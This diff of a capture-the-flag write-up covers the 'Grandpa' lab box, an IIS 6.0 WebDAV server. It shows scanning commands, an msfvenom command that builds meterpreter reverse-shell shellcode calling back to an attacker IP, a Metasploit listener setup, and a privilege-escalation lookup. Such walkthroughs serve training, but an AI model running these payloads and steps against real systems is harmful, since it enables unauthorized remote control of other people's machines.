@@ -13,11 +13,13 @@ Granpda is a Windows 2003 box running IIS 6.0 with webdav enabled. IIS was vuler
 ## Enumeration
 
 **Software**
+
 * Microsoft(R) Windows(R) Server 2003, Standard Edition
 * IIS 6.0
 * ASP.NET 1.1.4322
 
 **Port Scan**
+
 ```
 nmap -vv -Pn -sT -A --osscan-guess -p- -oN /mnt/data/boxes/grandpa/_full_tcp_nmap.txt
 ```
@@ -27,9 +29,11 @@ nmap -vv -Pn -sT -A --osscan-guess -p- -oN /mnt/data/boxes/grandpa/_full_tcp_nma
 ![image](assets/81748967-c6c4e400-9478-11ea-9483-32cc75edc2f1.png)
 
 **Nikto Scan**
+
 ```
 nikto -h 10.10.10.14
 ```
+
 ![image](assets/81599563-a1f84000-9396-11ea-845d-99a96104b8ab.png)
 
 **Davtest**
@@ -39,7 +43,6 @@ davtest -url http://10.10.10.14
 ```
 
 ![image](assets/81748823-7cdbfe00-9478-11ea-838d-2c8d9d679566.png)
-
 
 ## Steps (user)
 
@@ -60,11 +63,13 @@ I didn't have any luck with "WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflo
 I generated a staged meterpreter payload with msfvenom because the unstaged payload without meterpreter was calling back but immediately dropping the connection (like 41738.py).
 
 I generated a payload with MSFVenom and output a file
+
 ```
 msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.22 lport=4200 -f raw -e x86/alpha_mixed > shellcode
 ```
 
 I fired up metasploit and set up a meterpreter listener
+
 ```
 msfdb run
 set exploit/multi/handler
@@ -92,6 +97,7 @@ I used Windows Exploit Suggester to look for kernel exploits to escalate privile
 > [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) github repo.
 
 I ran the systeminfo command on the target system, copied the output to sysinfo.txt, and fed it into wes.py
+
 ```
 ./windows-exploit-suggester.py -l --database 2019-11-17-mssb.xls --systeminfo sysinfo.txt
 ```
